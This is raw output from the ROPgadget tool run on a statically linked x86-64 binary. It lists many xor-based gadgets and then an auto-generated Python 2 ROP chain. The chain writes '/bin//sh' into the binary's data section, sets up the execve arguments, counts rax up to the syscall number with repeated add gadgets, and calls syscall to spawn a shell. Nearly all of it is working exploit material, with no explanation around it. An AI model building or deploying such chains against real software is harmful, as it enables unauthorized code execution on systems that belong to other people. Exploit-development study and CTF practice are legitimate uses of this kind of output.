0x00000000004a7c8a : xor al, 0xd8 ; ret
0x0000000000459965 : xor al, 0xf0 ; test rsi, rsi ; je 0x459975 ; call rsi
0x00000000004534de : xor al, 0xf6 ; ret
0x0000000000495095 : xor al, 0xfa ; call rsp
0x0000000000494f59 : xor al, 0xfa ; jmp qword ptr [rax + 0x20fffa33]
0x0000000000494f55 : xor al, 0xfa ; jmp qword ptr [rax]
0x000000000045fc5c : xor al, 1 ; jmp 0x45deb6
0x0000000000475130 : xor al, ch ; retf 0xfaaf
0x00000000004946c0 : xor bh, bl ; stc ; push rax ; loopne 0x4946c7 ; call rax
0x00000000004950a5 : xor bh, dl ; call rsp
0x0000000000494f69 : xor bh, dl ; jmp qword ptr [rax + 0x20fffa31]
0x0000000000494f65 : xor bh, dl ; jmp qword ptr [rax]
0x000000000042bd1c : xor bl, al ; nop ; xor eax, eax ; ret
0x000000000042bbed : xor byte ptr [r14 + 0xf], r12b ; xlatb ; ret
0x0000000000411d72 : xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x00000000004485d4 : xor byte ptr [r8 - 0x7d], cl ; rol dword ptr [rax + 0x48], 0x39 ; retf 0xe475
0x000000000045c208 : xor byte ptr [rax + 0x39], cl ; ret 0x8d48
0x0000000000440a51 : xor byte ptr [rax + 0xf], cl ; ret 0x90c3
0x0000000000440eb2 : xor byte ptr [rax + 0xf], cl ; ret 0xf8c5
0x0000000000411d73 : xor byte ptr [rax + 1], cl ; ret 0x8b49
0x00000000004761f4 : xor byte ptr [rax + 1], cl ; retf
0x000000000044b56a : xor byte ptr [rax - 0x75], cl ; jge 0x44b520 ; mov r12d, r14d ; call r15
0x000000000044160f : xor byte ptr [rax - 0x77], cl ; add cl, byte ptr [rax - 0x7d] ; ret 0x4808
0x000000000047422f : xor byte ptr [rax - 0x77], cl ; out dx, eax ; call rbx
0x000000000048ac98 : xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x0000000000471ad2 : xor byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x000000000044daef : xor byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000402ff8 : xor byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00000000004485d5 : xor byte ptr [rax - 0x7d], cl ; rol dword ptr [rax + 0x48], 0x39 ; retf 0xe475
0x00000000004120cb : xor byte ptr [rax], 1 ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00000000004b198c : xor byte ptr [rax], ah ; add byte ptr [rax], dh ; xchg eax, ebp ; cli ; call qword ptr [rdx]
0x000000000040ea89 : xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x000000000040e9c3 : xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x000000000047447c : xor byte ptr [rax], al ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x000000000040eaaf : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x0000000000448ad3 : xor byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000471a0a : xor byte ptr [rax], al ; je 0x471a15 ; ret
0x00000000004b318c : xor byte ptr [rax], bh ; add byte ptr [rax], al ; adc edi, esp ; jmp qword ptr [rax]
0x0000000000495134 : xor byte ptr [rax], dh ; cli ; jmp qword ptr [rax + 0x10fffa2f]
0x000000000048e1fe : xor byte ptr [rbp + 0x27], dh ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000447a45 : xor byte ptr [rbp + 0xf], al ; adc dword ptr [rbx], eax ; ret
0x0000000000466959 : xor byte ptr [rbx + 0x291c2454], cl ; ret 0xe683
0x0000000000415456 : xor byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000044feba : xor byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000046c89e : xor byte ptr [rbx - 0x79f0f608], al ; ret
0x00000000004af590 : xor byte ptr [rbx - 9], bl ; jmp qword ptr [rbx]
0x0000000000494a3c : xor byte ptr [rbx], dl ; cli ; call rax
0x000000000048aab5 : xor byte ptr [rcx + 0x21], cl ; ror byte ptr [rax + 0x21], cl ; ret 0xc148
0x00000000004786f3 : xor byte ptr [rcx + 0x29], cl ; ret
0x000000000049454c : xor byte ptr [rcx + rdi*8 - 0x641ef01], bh ; jmp rax
0x0000000000494634 : xor byte ptr [rcx - 0x4d7f0007], dh ; stc ; call rax
0x0000000000495314 : xor byte ptr [rcx - 0x557f0006], ch ; cli ; call rax
0x000000000040402b : xor byte ptr [rcx - 0x75], al ; push rdi ; adc byte ptr [rdi], cl ; retf 0xd289
0x0000000000496244 : xor byte ptr [rcx - 5], dh ; call qword ptr [rax]
0x00000000004a6f8e : xor byte ptr [rcx], ah ; retf
0x00000000004120cc : xor byte ptr [rcx], al ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00000000004133b7 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004109e3 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x000000000045d58c : xor byte ptr [rdi], ch ; cli ; dec dword ptr [rax + 0x29] ; ret
0x0000000000470bb0 : xor byte ptr [rdi], cl ; ret 0x4389
0x00000000004945e0 : xor byte ptr [rdx - 0x547f0007], ch ; stc ; call rax
0x00000000004b08d7 : xor byte ptr [rsi + 0x380e4106], al ; add dword ptr [rdi], 3 ; ret 0xa01
0x000000000042cbef : xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000047345c : xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x000000000042bbee : xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00000000004b478c : xor byte ptr [rsi - 0x17300000], cl ; cld ; jmp qword ptr [rcx]
0x00000000004a8c9e : xor byte ptr [rsi - 0x73e34314], ch ; retf
0x0000000000494318 : xor byte ptr [rsi - 7], ch ; jmp qword ptr [rax]
0x00000000004a6f7f : xor byte ptr [rsi], cl ; or eax, 0xcad7947e ; jmp 0x4a6f2f
0x0000000000494f48 : xor byte ptr [rsi], dh ; cli ; jmp qword ptr [rax + 0x20fffa35]
0x000000000049464c : xor ch, ah ; stc ; call qword ptr [rax]
0x0000000000494261 : xor cl, bh ; jmp qword ptr [rax]
0x0000000000412afd : xor cl, byte ptr [rax - 0x77] ; ret 0x2948
0x000000000047ddf3 : xor cl, byte ptr [rax - 0x7d] ; ret 0x4810
0x000000000045bd77 : xor cl, byte ptr [rax - 0x7d] ; ret 0x4901
0x000000000048d28e : xor cl, byte ptr [rax] ; jne 0x48d2b3 ; mov rax, qword ptr [rax] ; ret
0x0000000000405d10 : xor cl, ch ; ret
0x00000000004039cc : xor dh, al ; mov edi, 0xdf8948ff ; call 0x4004c9
0x000000000045abc9 : xor dh, dh ; ret 0x4002
0x0000000000494ff5 : xor dl, bh ; call rdx
0x0000000000495135 : xor dl, bh ; jmp qword ptr [rax + 0x10fffa2f]
0x0000000000495171 : xor dl, bh ; jmp qword ptr [rax]
0x0000000000494f79 : xor dl, bh ; push qword ptr [rax + 0x2f] ; cli ; jmp rsi
0x00000000004240aa : xor dl, byte ptr [rbx] ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x00000000004801ae : xor dl, dh ; jmp r11
0x00000000004802c0 : xor dl, dh ; ret
0x0000000000465f2d : xor dword ptr [rax - 0x77], ecx ; ror dword ptr [rax - 0x77], 1 ; ret 0xe7e9
0x00000000004a7f36 : xor dword ptr [rax - 0x7d993651], ebp ; retf 0xe496
0x000000000044cabf : xor dword ptr [rax - 0x7d], ecx ; ret 0xf01
0x000000000048d2fd : xor dword ptr [rax], ecx ; jne 0x48d30c ; mov qword ptr [rax], rdx ; ret
0x000000000041c7a9 : xor dword ptr [rbx - 0x76b7f020], eax ; ret 0x8948
0x0000000000424132 : xor dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000424df1 : xor dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000047fd5a : xor dword ptr [rsi + 0x63], esi ; call qword ptr [rip + 0x23cafd]
0x000000000046b8ae : xor eax, 0x24b56d ; jmp rax
0x0000000000494f51 : xor eax, 0x34a0fffa ; cli ; jmp qword ptr [rax]
0x0000000000495089 : xor eax, 0x3554fffa ; cli ; call rsp
0x00000000004954a9 : xor eax, 0x35b8fffb ; sti ; call rax
0x000000000049552d : xor eax, 0x35cefffb ; sti ; jmp rbx
0x0000000000448003 : xor eax, 0x48000002 ; mov ecx, edx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000044b07a : xor eax, 0x7d8b48 ; call r12
0x00000000004550a7 : xor eax, 0x89fffacb ; retf 0xe283
0x000000000046583a : xor eax, 0x89ffffe6 ; ret
0x0000000000487809 : xor eax, 0xb1ba0002 ; add al, byte ptr [rax] ; add al, ch ; retf 0xf7a3
0x000000000040ea86 : xor eax, dword ptr [0x30] ; call rax
0x00000000004a4f40 : xor eax, dword ptr [rsi + 0x7368fffd] ; std ; jmp qword ptr [rax]
0x00000000004a4fcc : xor eax, dword ptr [rsi + 0x75c0fffd] ; std ; call qword ptr [rax]
0x0000000000416070 : xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000416e54 : xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000045d2b9 : xor eax, eax ; add rsp, 8 ; ret
0x0000000000475a3b : xor eax, eax ; cmp rdi, rdx ; ja 0x475a70 ; ret
0x000000000044c687 : xor eax, eax ; cmp rdx, rdi ; setae al ; ret
0x000000000040f5ac : xor eax, eax ; jmp 0x40f574
0x000000000040f5ab : xor eax, eax ; jmp 0x40f575
0x0000000000415000 : xor eax, eax ; jmp 0x414fca
0x00000000004720e4 : xor eax, eax ; jmp 0x4720b1
0x0000000000475e28 : xor eax, eax ; leave ; ret
0x0000000000473242 : xor eax, eax ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000405eaf : xor eax, eax ; pop rbp ; pop r12 ; ret
0x00000000004150ab : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000040ed95 : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000042417c : xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000000413722 : xor eax, eax ; pop rbx ; ret
0x000000000040ecdd : xor eax, eax ; ret
0x00000000004267fe : xor eax, eax ; sub eax, ecx ; ret
0x000000000044a14a : xor eax, eax ; syscall
0x00000000004150d0 : xor eax, eax ; test rdx, rdx ; jne 0x4150e8 ; ret
0x000000000042c0dc : xor eax, eax ; vzeroupper ; ret
0x0000000000459528 : xor ebp, ecx ; ret 0xfffd
0x000000000047a300 : xor ebx, ebx ; jmp 0x47a2c9
0x0000000000485a2d : xor ebx, ebx ; lea rdx, [rax + 8] ; lea rcx, [rdx + rcx*8] ; jmp 0x485a4d
0x0000000000459226 : xor ebx, ebx ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004647cc : xor ecx, dword ptr [rdi] ; mov esi, 0xc08349c8 ; add dword ptr [rcx], edi ; retf
0x00000000004581f9 : xor ecx, ecx ; call r15
0x0000000000474039 : xor ecx, ecx ; xor edx, edx ; lea r9, [rsp + 0x20] ; call rbx
0x000000000044ca9c : xor edi, dword ptr [rax] ; ret 0x2f75
0x00000000004b510d : xor edi, ebp ; jmp qword ptr [rdx]
0x00000000004001c1 : xor edi, ebp ; retf 0x6500
0x0000000000401328 : xor edi, edi ; mov eax, edx ; syscall
0x000000000044aea6 : xor edi, edi ; or r10d, 0x40 ; mov eax, ecx ; syscall
0x000000000041b471 : xor edi, edi ; pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
0x000000000044acbc : xor edi, edi ; syscall
0x000000000049509d : xor edi, edx ; call rsp
0x0000000000494f61 : xor edi, edx ; jmp qword ptr [rax + 0x20fffa32]
0x0000000000494f5d : xor edi, edx ; jmp qword ptr [rax]
0x000000000040e9c0 : xor edx, dword ptr [0x30] ; call rdx
0x00000000004950ad : xor edx, edi ; call rsp
0x0000000000494f6d : xor edx, edi ; jmp qword ptr [rax]
0x000000000044f143 : xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x000000000044dd1c : xor edx, edx ; cmp ebx, eax ; setne dl ; jmp 0x44dd0c
0x000000000046ff43 : xor edx, edx ; div r13 ; mov rbp, rax ; jmp 0x46ff18
0x0000000000417a23 : xor edx, edx ; jmp rax
0x000000000047403b : xor edx, edx ; lea r9, [rsp + 0x20] ; call rbx
0x000000000041fd2c : xor edx, edx ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x0000000000478b96 : xor esi, esi ; call 0x400491
0x00000000004ac549 : xor esi, esi ; jmp qword ptr [rax]
0x00000000004615cc : xor esi, esi ; jmp rax
0x00000000004581f8 : xor r9d, r9d ; call r15
0x000000000040ea85 : xor rax, qword ptr [0x30] ; call rax
0x000000000040ea84 : xor rax, qword ptr fs:[0x30] ; call rax
0x0000000000445460 : xor rax, rax ; ret
0x000000000040e9bf : xor rdx, qword ptr [0x30] ; call rdx
0x000000000040e9be : xor rdx, qword ptr fs:[0x30] ; call rdx

Unique gadgets found: 11056

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x47f521 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x410a93 pop rsi ; ret
	[+] Gadget found: 0x415f04 pop rax ; ret
	[+] Gadget found: 0x445460 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x445460 xor rax, rax ; ret
	[+] Gadget found: 0x474970 add rax, 1 ; ret
	[+] Gadget found: 0x474971 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x400686 pop rdi ; ret
	[+] Gadget found: 0x410a93 pop rsi ; ret
	[+] Gadget found: 0x44a155 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x47b6bf syscall

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e0) # @ .data
	p += pack('<Q', 0x0000000000415f04) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x000000000047f521) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x0000000000445460) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000047f521) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
	p += pack('<Q', 0x00000000006b90e0) # @ .data
	p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x000000000044a155) # pop rdx ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x0000000000445460) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b6bf) # syscall
